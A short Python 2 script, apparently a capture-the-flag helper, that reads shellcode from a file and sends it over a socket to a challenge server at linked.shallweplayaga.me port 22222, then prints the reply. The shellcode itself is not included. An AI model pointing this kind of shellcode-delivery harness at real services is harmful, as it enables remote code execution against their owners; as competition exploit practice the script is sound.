#!/usr/bin/env python2

import os, sys, socket

s = socket.socket()
s.connect(('linked.shallweplayaga.me', 22222))

f = open(sys.argv[1])

#
# List built.  Send me your shellcode.  Max size: 16

shellcode = f.read()

s.send(shellcode)

print 'sent...'

s.shutdown(socket.SHUT_WR)

print s.recv(4096)
